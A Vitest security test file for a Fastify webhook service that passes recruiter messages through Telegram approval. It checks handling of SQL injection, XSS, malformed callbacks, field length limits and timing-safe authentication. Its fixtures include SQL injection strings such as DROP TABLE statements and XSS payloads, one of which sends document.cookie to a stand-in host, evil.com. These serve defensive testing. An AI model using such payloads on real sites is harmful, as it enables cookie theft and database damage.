import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import Fastify, { FastifyInstance } from 'fastify';
import crypto from 'node:crypto';
import { webhookRoutes } from '../src/routes/webhook.js';

// ── Mocks ──────────────────────────────────────────────────────────────────

vi.mock('../src/config.js', () => ({
  config: {
    port: 8000,
    host: '127.0.0.1',
    telegramBotToken: 'test-token',
    telegramUserId: '123456789',
    apiKey: 'test-api-key',
    telegramWebhookSecret: 'test-webhook-secret',
    extensionId: 'test-extension-id',
    databasePath: ':memory:',
    googleClientId: 'test-client-id',
    googleClientSecret: 'test-client-secret',
    googleRefreshToken: 'test-refresh-token',
  },
  validateConfig: vi.fn(),
}));

vi.mock('node-telegram-bot-api', () => ({
  default: vi.fn().mockImplementation(() => ({
    sendMessage: vi.fn().mockResolvedValue({ message_id: 1 }),
    answerCallbackQuery: vi.fn().mockResolvedValue(true),
    editMessageText: vi.fn().mockResolvedValue({ message_id: 1 }),
    editMessageReplyMarkup: vi.fn().mockResolvedValue({ message_id: 1 }),
  })),
}));

vi.mock('../src/services/telegram.js', () => ({
  sendApprovalRequest: vi.fn().mockResolvedValue(undefined),
  handleCallbackQuery: vi.fn().mockResolvedValue({
    message_id: 'msg_sec_default',
    action: 'lets_talk',
  }),
}));

vi.mock('../src/services/calendar.js', () => ({
  generateTimeSlots: vi.fn().mockReturnValue([
    '2026-03-30T14:00:00.000Z',
    '2026-03-30T18:00:00.000Z',
    '2026-03-30T20:00:00.000Z',
  ]),
  scheduleMeeting: vi.fn().mockResolvedValue({ id: 'event_sec_1' }),
}));

// database.js is NOT mocked — all suites use real in-memory SQLite

import { handleCallbackQuery } from '../src/services/telegram.js';

// ── Helpers ────────────────────────────────────────────────────────────────

async function makeApp(): Promise<FastifyInstance> {
  const app = Fastify();
  await app.register(webhookRoutes);
  return app;
}

const AUTH = { 'X-API-Key': 'test-api-key' };
const TGSECRET = { 'X-Telegram-Bot-Api-Secret-Token': 'test-webhook-secret' };

const BASE_MSG = {
  message_id: 'msg_sec_1',
  thread_id: 'thread_sec_1',
  sender: { name: 'Alice', title: 'Recruiter', company: 'Acme' },
  content: 'We have an opportunity for you',
  timestamp: '2026-01-01T00:00:00Z',
};

// ── Suite 1: SQL Injection ─────────────────────────────────────────────────

describe('security: SQL injection', () => {
  let app: FastifyInstance;

  beforeEach(async () => {
    vi.clearAllMocks();
    app = await makeApp();
  });

  afterEach(async () => {
    await app.close();
  });

  const SQL_PAYLOADS = [
    "'; DROP TABLE messages;--",
    '" OR "1"="1',
    '1 UNION SELECT * FROM messages--',
    "'; INSERT INTO messages (id) VALUES ('evil');--",
    '1; SELECT * FROM sqlite_master WHERE type="table"--',
  ] as const;

  it.each(SQL_PAYLOADS)(
    'stores injection payload as literal message_id without executing SQL: %s',
    async (injection) => {
      // Store a message whose ID is the injection string
      const postRes = await app.inject({
        method: 'POST',
        url: '/webhook/message',
        payload: { ...BASE_MSG, message_id: injection },
        headers: AUTH,
      });
      expect(postRes.statusCode).toBe(200);

      // The callback mock returns the same injection string as message_id;
      // the route must retrieve the stored message via parameterized query
      vi.mocked(handleCallbackQuery).mockResolvedValueOnce({
        message_id: injection,
        action: 'lets_talk',
      });

      const cbRes = await app.inject({
        method: 'POST',
        url: '/webhook/telegram/callback',
        payload: {
          callback_query: {
            id: 'cb_sql',
            data: JSON.stringify({ m: injection, a: 'lt' }),
            message: { chat: { id: 111 }, message_id: 999 },
          },
        },
        headers: TGSECRET,
      });
      expect(cbRes.statusCode).toBe(200);

      // If parameterized queries work, the stored thread_id is returned —
      // not a fallback derived from the injection string
      const body = JSON.parse(cbRes.payload);
      expect(body.thread_id).toBe(BASE_MSG.thread_id);
    }
  );

  it('stores SQL injection in content field as literal text', async () => {
    const injection = "'; DROP TABLE messages; SELECT * FROM messages WHERE '1'='1";
    const res = await app.inject({
      method: 'POST',
      url: '/webhook/message',
      payload: { ...BASE_MSG, message_id: 'msg_content_sql', content: injection },
      headers: AUTH,
    });
    expect(res.statusCode).toBe(200);

    // DB still operates correctly after the injection attempt
    const poll = await app.inject({
      method: 'GET',
      url: '/webhook/pending-replies',
      headers: AUTH,
    });
    expect(poll.statusCode).toBe(200);
  });

  it('stores SQL injection in sender fields without crashing', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/webhook/message',
      payload: {
        ...BASE_MSG,
        message_id: 'msg_sender_sql',
        sender: {
          name: "Robert'; DROP TABLE messages;--",
          title: "'; UPDATE messages SET status='pending';--",
          company: '1 OR 1=1',
        },
      },
      headers: AUTH,
    });
    expect(res.statusCode).toBe(200);
  });

  it('handles SQL injection through updateMessageStatus without corrupting DB', async () => {
    const injection = "'; UPDATE messages SET status='not_interested' WHERE '1'='1";
    vi.mocked(handleCallbackQuery).mockResolvedValueOnce({
      message_id: injection,
      action: 'not_interested',
    });

    const res = await app.inject({
      method: 'POST',
      url: '/webhook/telegram/callback',
      payload: {
        callback_query: {
          id: 'cb_update_sql',
          data: JSON.stringify({ m: injection, a: 'ni' }),
          message: { chat: { id: 111 }, message_id: 999 },
        },
      },
      headers: TGSECRET,
    });
    expect(res.statusCode).toBe(200);

    // DB responds normally after the injection attempt
    const poll = await app.inject({
      method: 'GET',
      url: '/webhook/pending-replies',
      headers: AUTH,
    });
    expect(poll.statusCode).toBe(200);
  });
});

// ── Suite 2: XSS Injection ─────────────────────────────────────────────────

describe('security: XSS injection', () => {
  let app: FastifyInstance;

  beforeEach(async () => {
    vi.clearAllMocks();
    app = await makeApp();
  });

  afterEach(async () => {
    await app.close();
  });

  const XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror="alert(document.cookie)">',
    '<a href="javascript:alert(1)">click</a>',
    '<svg/onload=alert(1)>',
    '"><script>fetch("https://evil.com?c="+document.cookie)</script>',
    '<script>alert(1)</script>',
  ] as const;

  it.each(XSS_PAYLOADS)(
    'accepts XSS payload in content as plain text (stored, not rendered): %s',
    async (xss) => {
      const res = await app.inject({
        method: 'POST',
        url: '/webhook/message',
        payload: { ...BASE_MSG, message_id: `msg_xss_${Math.random()}`, content: xss },
        headers: AUTH,
      });
      // Backend is a data store; XSS content is text, not executable here
      expect(res.statusCode).toBe(200);
      expect(JSON.parse(res.payload).success).toBe(true);
    }
  );

  it('accepts XSS in sender fields without crashing', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/webhook/message',
      payload: {
        ...BASE_MSG,
        message_id: 'msg_xss_sender',
        sender: {
          name: '<script>alert(1)</script>',
          title: '<img onerror="alert(1)" src=x>',
          company: '<svg/onload=alert(1)>',
        },
      },
      headers: AUTH,
    });
    expect(res.statusCode).toBe(200);
  });

  it('accepts XSS in drafted_reply and stores it as plain text', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/webhook/reply',
      payload: {
        message_id: 'msg_xss_reply',
        thread_id: 'thread_xss',
        user_choice: 'not_interested',
        drafted_reply: '<script>alert(document.cookie)</script>',
      },
      headers: AUTH,
    });
    expect(res.statusCode).toBe(200);
  });

  it('handles null byte in content without crashing', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/webhook/message',
      payload: { ...BASE_MSG, message_id: 'msg_null_byte', content: 'hello world' },
      headers: AUTH,
    });
    // Schema may accept or reject null bytes — either way, no unhandled crash
    expect([200, 400]).toContain(res.statusCode);
  });
});

// ── Suite 3: Malformed Telegram Callbacks ──────────────────────────────────

describe('security: malformed Telegram callbacks', () => {
  let app: FastifyInstance;

  const VALID_CALLBACK_BODY = {
    callback_query: {
      id: 'cb_1',
      data: '{"m":"msg_sec_default","a":"lt"}',
      message: { chat: { id: 111 }, message_id: 999 },
    },
  };

  beforeEach(async () => {
    vi.clearAllMocks();
    app = await makeApp();
  });

  afterEach(async () => {
    await app.close();
  });

  it('rejects callback with no Telegram secret header', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/webhook/telegram/callback',
      payload: VALID_CALLBACK_BODY,
    });
    expect(res.statusCode).toBe(401);
  });

  it('rejects callback with wrong Telegram secret (same length)', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/webhook/telegram/callback',
      payload: VALID_CALLBACK_BODY,
      headers: { 'X-Telegram-Bot-Api-Secret-Token': 'XXXX-webhook-XXXXX' },
    });
    expect(res.statusCode).toBe(401);
  });

  it('rejects callback with empty Telegram secret', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/webhook/telegram/callback',
      payload: VALID_CALLBACK_BODY,
      headers: { 'X-Telegram-Bot-Api-Secret-Token': '' },
    });
    expect(res.statusCode).toBe(401);
  });

  it('rejects callback missing callback_query field (Fastify schema validation)', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/webhook/telegram/callback',
      payload: { not_a_query: 'evil' },
      headers: TGSECRET,
    });
    expect(res.statusCode).toBe(400);
  });

  it('returns 500 when handleCallbackQuery throws on non-JSON data (no unhandled rejection)', async () => {
    vi.mocked(handleCallbackQuery).mockRejectedValueOnce(
      new Error('Invalid callback data format')
    );
    const res = await app.inject({
      method: 'POST',
      url: '/webhook/telegram/callback',
      payload: {
        callback_query: { id: 'cb_bad', data: 'not-valid-json', message: null },
      },
      headers: TGSECRET,
    });
    // Route catches the error and responds with 500 — not a crash
    expect(res.statusCode).toBe(500);
    expect(JSON.parse(res.payload)).toHaveProperty('error');
  });

  it('handles unknown action code without crashing', async () => {
    vi.mocked(handleCallbackQuery).mockResolvedValueOnce({
      message_id: 'msg_unknown',
      action: 'lets_talk',
    });
    const res = await app.inject({
      method: 'POST',
      url: '/webhook/telegram/callback',
      payload: {
        callback_query: {
          id: 'cb_unknown',
          data: '{"m":"msg_unknown","a":"xx"}',
          message: { chat: { id: 111 }, message_id: 999 },
        },
      },
      headers: TGSECRET,
    });
    // Message not in DB → fallback data used; route still completes
    expect(res.statusCode).toBe(200);
  });

  it('parameterized queries handle SQL injection in callback message_id safely', async () => {
    const injection = "'; DROP TABLE messages;--";
    vi.mocked(handleCallbackQuery).mockResolvedValueOnce({
      message_id: injection,
      action: 'not_interested',
    });
    const res = await app.inject({
      method: 'POST',
      url: '/webhook/telegram/callback',
      payload: {
        callback_query: {
          id: 'cb_sql',
          data: JSON.stringify({ m: injection, a: 'ni' }),
          message: { chat: { id: 111 }, message_id: 999 },
        },
      },
      headers: TGSECRET,
    });
    // DB parameterized query returns null for the injection string; route uses fallback
    expect(res.statusCode).toBe(200);

    // DB still responds correctly after the injection attempt
    const poll = await app.inject({
      method: 'GET',
      url: '/webhook/pending-replies',
      headers: AUTH,
    });
    expect(poll.statusCode).toBe(200);
  });

  it('handles oversized callback_query.data string without crashing', async () => {
    vi.mocked(handleCallbackQuery).mockResolvedValueOnce({
      message_id: 'msg_oversize',
      action: 'not_interested',
    });
    const res = await app.inject({
      method: 'POST',
      url: '/webhook/telegram/callback',
      payload: {
        callback_query: {
          id: 'cb_big',
          data: 'x'.repeat(512),
          message: { chat: { id: 111 }, message_id: 999 },
        },
      },
      headers: TGSECRET,
    });
    // No crash — schema accepts any callback_query object shape
    expect(res.statusCode).toBeDefined();
    expect([200, 400, 500]).toContain(res.statusCode);
  });
});

// ── Suite 4: Oversized Payloads / Field Boundary Enforcement ──────────────

describe('security: oversized payloads and field boundary enforcement', () => {
  let app: FastifyInstance;

  beforeEach(async () => {
    vi.clearAllMocks();
    app = await makeApp();
  });

  afterEach(async () => {
    await app.close();
  });

  function validMsg(overrides: Record<string, unknown> = {}) {
    return {
      message_id: 'msg_boundary',
      thread_id: 'thread_boundary',
      sender: { name: 'Alice', title: 'Recruiter', company: 'Acme' },
      content: 'We have an opportunity for you',
      timestamp: '2026-01-01T00:00:00Z',
      ...overrides,
    };
  }

  it('accepts message_id at max length (128 chars)', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: validMsg({ message_id: 'a'.repeat(128) }), headers: AUTH,
    });
    expect(res.statusCode).toBe(200);
  });

  it('rejects message_id one char over max (129 chars)', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: validMsg({ message_id: 'a'.repeat(129) }), headers: AUTH,
    });
    expect(res.statusCode).toBe(400);
  });

  it('accepts content at max length (10 000 chars)', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: validMsg({ message_id: 'msg_c_max', content: 'x'.repeat(10000) }), headers: AUTH,
    });
    expect(res.statusCode).toBe(200);
  });

  it('rejects content one char over max (10 001 chars)', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: validMsg({ message_id: 'msg_c_over', content: 'x'.repeat(10001) }), headers: AUTH,
    });
    expect(res.statusCode).toBe(400);
  });

  it('accepts sender.name at max length (100 chars)', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: validMsg({ message_id: 'msg_n_max', sender: { name: 'a'.repeat(100), title: 'T', company: 'C' } }), headers: AUTH,
    });
    expect(res.statusCode).toBe(200);
  });

  it('rejects sender.name one char over max (101 chars)', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: validMsg({ message_id: 'msg_n_over', sender: { name: 'a'.repeat(101), title: 'T', company: 'C' } }), headers: AUTH,
    });
    expect(res.statusCode).toBe(400);
  });

  it('accepts sender.title at max length (200 chars)', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: validMsg({ message_id: 'msg_t_max', sender: { name: 'A', title: 'a'.repeat(200), company: 'C' } }), headers: AUTH,
    });
    expect(res.statusCode).toBe(200);
  });

  it('rejects sender.title one char over max (201 chars)', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: validMsg({ message_id: 'msg_t_over', sender: { name: 'A', title: 'a'.repeat(201), company: 'C' } }), headers: AUTH,
    });
    expect(res.statusCode).toBe(400);
  });

  it('accepts sender.company at max length (200 chars)', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: validMsg({ message_id: 'msg_co_max', sender: { name: 'A', title: 'T', company: 'a'.repeat(200) } }), headers: AUTH,
    });
    expect(res.statusCode).toBe(200);
  });

  it('rejects sender.company one char over max (201 chars)', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: validMsg({ message_id: 'msg_co_over', sender: { name: 'A', title: 'T', company: 'a'.repeat(201) } }), headers: AUTH,
    });
    expect(res.statusCode).toBe(400);
  });

  it('accepts preferredTechStack with exactly 50 items', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: validMsg({
        message_id: 'msg_stack_50',
        criteria: { minSeniority: 'senior', preferredTechStack: Array(50).fill('Go'), avoidKeywords: [], locations: [], minCompensation: 0 },
      }), headers: AUTH,
    });
    expect(res.statusCode).toBe(200);
  });

  it('rejects preferredTechStack with 51 items', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: validMsg({
        message_id: 'msg_stack_51',
        criteria: { minSeniority: 'senior', preferredTechStack: Array(51).fill('Go'), avoidKeywords: [], locations: [], minCompensation: 0 },
      }), headers: AUTH,
    });
    expect(res.statusCode).toBe(400);
  });

  it('accepts tech stack items at max item length (100 chars)', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: validMsg({
        message_id: 'msg_item_100',
        criteria: { minSeniority: 'mid', preferredTechStack: ['a'.repeat(100)], avoidKeywords: [], locations: [], minCompensation: 0 },
      }), headers: AUTH,
    });
    expect(res.statusCode).toBe(200);
  });

  it('rejects tech stack items over max item length (101 chars)', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: validMsg({
        message_id: 'msg_item_101',
        criteria: { minSeniority: 'mid', preferredTechStack: ['a'.repeat(101)], avoidKeywords: [], locations: [], minCompensation: 0 },
      }), headers: AUTH,
    });
    expect(res.statusCode).toBe(400);
  });

  it('rejects drafted_reply over max length (10 001 chars) via /webhook/reply', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/reply',
      payload: { message_id: 'msg_reply_over', drafted_reply: 'x'.repeat(10001) },
      headers: AUTH,
    });
    expect(res.statusCode).toBe(400);
  });

  it('rejects invalid minSeniority enum value', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: validMsg({
        message_id: 'msg_enum',
        criteria: { minSeniority: 'intern', preferredTechStack: [], avoidKeywords: [], locations: [], minCompensation: 0 },
      }), headers: AUTH,
    });
    expect(res.statusCode).toBe(400);
  });

  it('rejects negative minCompensation', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: validMsg({
        message_id: 'msg_comp_neg',
        criteria: { minSeniority: 'mid', preferredTechStack: [], avoidKeywords: [], locations: [], minCompensation: -1 },
      }), headers: AUTH,
    });
    expect(res.statusCode).toBe(400);
  });
});

// ── Suite 5: Auth Timing Safety ────────────────────────────────────────────

describe('security: auth timing safety', () => {
  let app: FastifyInstance;

  beforeEach(async () => {
    vi.clearAllMocks();
    app = await makeApp();
  });

  afterEach(async () => {
    vi.clearAllMocks();
    await app.close();
  });

  it('returns 200 with correct API key', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: { ...BASE_MSG, message_id: 'msg_auth_ok' }, headers: AUTH,
    });
    expect(res.statusCode).toBe(200);
  });

  it('returns 401 with wrong API key of same length', async () => {
    // 'test-api-key' is 12 chars; 'xxxx-api-key' is also 12 chars
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: { ...BASE_MSG, message_id: 'msg_wrong_key' },
      headers: { 'X-API-Key': 'xxxx-api-key' },
    });
    expect(res.statusCode).toBe(401);
  });

  it('returns 401 with key shorter than configured', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: { ...BASE_MSG, message_id: 'msg_short_key' },
      headers: { 'X-API-Key': 'short' },
    });
    expect(res.statusCode).toBe(401);
  });

  it('returns 401 with key longer than configured', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: { ...BASE_MSG, message_id: 'msg_long_key' },
      headers: { 'X-API-Key': 'test-api-key-but-much-longer-than-expected' },
    });
    expect(res.statusCode).toBe(401);
  });

  it('returns 401 with empty API key', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: { ...BASE_MSG, message_id: 'msg_empty_key' },
      headers: { 'X-API-Key': '' },
    });
    expect(res.statusCode).toBe(401);
  });

  it('returns 401 with missing X-API-Key header', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: { ...BASE_MSG, message_id: 'msg_no_key' },
    });
    expect(res.statusCode).toBe(401);
  });

  it('calls crypto.timingSafeEqual even when key lengths differ (prevents timing oracle)', async () => {
    // The timingSafeEqual wrapper in webhook.ts calls crypto.timingSafeEqual(bufA, bufA)
    // for length-mismatched keys so that comparison time is constant regardless of key length
    const spy = vi.spyOn(crypto, 'timingSafeEqual');
    await app.inject({
      method: 'POST', url: '/webhook/message',
      payload: { ...BASE_MSG, message_id: 'msg_oracle' },
      headers: { 'X-API-Key': 'short' },
    });
    expect(spy).toHaveBeenCalled();
    spy.mockRestore(); // restore only this spy — avoids resetting module mock implementations
  });

  it('returns 200 for Telegram callback with correct secret (no API key required)', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/telegram/callback',
      payload: {
        callback_query: {
          id: 'cb_sec',
          data: '{"m":"msg_sec_default","a":"lt"}',
          message: { chat: { id: 111 }, message_id: 999 },
        },
      },
      headers: TGSECRET,
    });
    expect(res.statusCode).toBe(200);
  });

  it('returns 401 for Telegram callback with wrong secret', async () => {
    const res = await app.inject({
      method: 'POST', url: '/webhook/telegram/callback',
      payload: {
        callback_query: {
          id: 'cb_wrong',
          data: '{"m":"msg_sec_default","a":"lt"}',
          message: { chat: { id: 111 }, message_id: 999 },
        },
      },
      headers: { 'X-Telegram-Bot-Api-Secret-Token': 'wrong-secret-xyz' },
    });
    expect(res.statusCode).toBe(401);
  });
});
